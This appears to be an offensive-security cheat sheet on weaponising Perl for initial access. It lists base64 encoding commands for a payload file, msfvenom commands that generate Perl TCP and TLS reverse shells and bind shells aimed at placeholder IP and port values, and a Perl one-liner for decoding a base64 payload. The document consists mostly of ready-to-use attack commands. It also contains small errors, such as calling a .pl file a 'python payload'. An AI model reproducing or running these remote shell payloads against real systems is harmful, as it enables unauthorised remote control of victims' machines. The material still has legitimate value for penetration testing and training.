---
author(s):
  - Userware
tags:
  - initial-access
  - weaponization
  - client-side-attacks
  - cross-platform
  - perl
---
# Manual

> [!INFO] Preinstalled Interpreter
> The `perl` interpreter is preinstalled across all of the GNU/Linux operating systems.

## 01 - Base64 Encoded

Encode the python payload.

```
$ basenc -w 0 --base64 payload.pl

$ base64 -w 0 payload.pl

$ openssl enc -a -e -A -in payload.pl

$ openssl enc -base64 -A -in payload.pl
```

## 02 - Generate Payloads

### 2.1 - Linux

#### 2.1.1 - Generate a payload via `msfvenom`

##### 2.1.1.1 - Reverse Shells

Stageless TCP reverse shell.

```
$ msfvenom -p cmd/unix/reverse_perl lhost=<IP> lport=<PORT>
```

Stageless TLS reverse shell.

```
$ msfvenom -p cmd/unix/reverse_perl_ssl handlersslcert=[/path/to/file.pem] sslversion=[Auto | TLS | SSL23 | SSL3 | TLS1 | TLS1.1 | TLS1.2] lhost=<IP> lport=<PORT>
```

##### 2.1.1.2 - Bind Shells

```
$ msfvenom -p cmd/unix/bind_perl lport=<PORT>

$ msfvenom -p cmd/unix/bind_perl_ipv6 lport=<PORT>
```

## 03 - Execute Payloads

> [!TIP]
> On windows, you can combine with a enumeration function to check one of the [[Compilers|compilers]] exist in order to execute the payload especially when the target is windows.

### 3.1 - Cross Platform

```
> perl -MMIME::Base64 -e 'print decode_base64("<base64_payload>")'
```

---
## References

### GTFOBins

- [GTFOBins: Perl](https://gtfobins.github.io/gtfobins/perl/)

- [GTFOBins: Perlbug](https://gtfobins.github.io/gtfobins/perlbug/)